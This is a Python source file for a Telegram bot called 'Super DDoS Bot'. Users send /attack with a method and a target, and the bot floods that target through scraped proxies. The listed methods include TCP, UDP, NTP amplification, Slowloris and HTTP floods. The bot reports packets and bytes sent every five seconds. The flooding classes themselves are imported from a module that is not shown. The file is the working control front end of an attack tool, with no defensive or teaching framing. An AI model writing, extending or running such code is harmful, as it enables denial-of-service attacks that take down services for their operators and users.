import telebot
import asyncio
from threading import Thread
import socket
from time import sleep
from proxy_manager import ProxyManager
from .attack_methods import Layer4Attack, Layer7Attack
from .config import config
import logging
import psutil

logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', level=logging.INFO)
logger = logging.getLogger("DDoSBot")

bot = telebot.TeleBot(config["telegram_token"])
attacks = {}
proxies = set()

def load_proxies():
    async def fetch():
        global proxies
        pm = ProxyManager(config["proxy_sources"])
        proxies = await pm.gather_proxies()
    asyncio.run(fetch())

def format_status(attack):
    return (
        f"🔥 *Attack Status* 🔥\n"
        f"🎯 *Target*: `{attack.target}`\n"
        f"⚙️ *Method*: `{attack.method}`\n"
        f"📤 *Bytes Sent*: `{humanbytes(attack.bytes_sent)}`\n"
        f"📦 *Requests Sent*: `{attack.requests_sent}`\n"
        f"🚀 *PPS*: `{attack.requests_sent // max(1, int(attack.duration / 5))}`/s\n"
        f"📊 *BPS*: `{humanbytes(attack.bytes_sent // max(1, int(attack.duration / 5)))}`/s\n"
        f"🖥️ *CPU Usage*: `{psutil.cpu_percent()}%`\n"
        f"💾 *Memory Usage*: `{psutil.virtual_memory().percent}%`\n"
        f"🔗 *Proxies*: `{len(proxies)}`"
    )

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, (
        "🌟 *Super DDoS Bot* 🌟\n"
        "🔧 *Commands*:\n"
        "  `/attack <method> <target> [duration]` - Start attack\n"
        "  `/stop` - Stop attack\n"
        "  `/proxies` - Check proxies\n"
        "💡 *Supported Methods*: TCP, UDP, NTP, SLOWLORIS, GET, POST, HTTP2, CFB"
    ), parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack(message):
    global proxies
    args = message.text.split()[1:]
    if len(args) < 2:
        bot.reply_to(message, "❌ *Usage*: `/attack <method> <target> [duration]`", parse_mode="Markdown")
        return

    method, target = args[0], args[1]
    duration = int(args[2]) if len(args) > 2 else config["default_duration"]

    if psutil.cpu_percent() > config["max_cpu_usage"]:
        bot.reply_to(message, "⚠️ *CPU usage too high, try again later!*", parse_mode="Markdown")
        return

    try:
        if "http" in target.lower():
            attack = Layer7Attack(target, method, proxies, config["default_threads"], duration)
        else:
            if ":" not in target:
                target += ":80"
            host, port = target.split(":")
            socket.gethostbyname(host)  # Kiểm tra tên miền hoặc IP
            attack = Layer4Attack(host + ":" + port, method, proxies, config["default_threads"], duration)

        attack.event.set()
        attack.start()
        attacks[message.chat.id] = attack
        bot.reply_to(message, (
            f"✅ *Attack Launched* ✅\n"
            f"🎯 *Target*: `{target}`\n"
            f"⚙️ *Method*: `{method}`\n"
            f"⏳ *Duration*: `{duration}s`\n"
            f"🧵 *Threads*: `{attack.threads}`"
        ), parse_mode="Markdown")

        def report_status():
            while attack.event.is_set():
                sleep(5)
                bot.send_message(message.chat.id, format_status(attack), parse_mode="Markdown")
        Thread(target=report_status, daemon=True).start()
    except Exception as e:
        bot.reply_to(message, f"❌ *Error*: `{str(e)}`", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop(message):
    if message.chat.id in attacks:
        attacks[message.chat.id].event.clear()
        bot.reply_to(message, (
            "🛑 *Attack Stopped* 🛑\n"
            f"📊 *Final Report*:\n{format_status(attacks[message.chat.id])}"
        ), parse_mode="Markdown")
        del attacks[message.chat.id]
    else:
        bot.reply_to(message, "⚠️ *No active attack found!*", parse_mode="Markdown")

@bot.message_handler(commands=['proxies'])
def proxies_cmd(message):
    global proxies
    if not proxies:
        load_proxies()
    bot.reply_to(message, f"🔗 *Working Proxies*: `{len(proxies)}`", parse_mode="Markdown")

if __name__ == "__main__":
    load_proxies()
    logger.info("Bot started.")
    bot.polling(none_stop=True)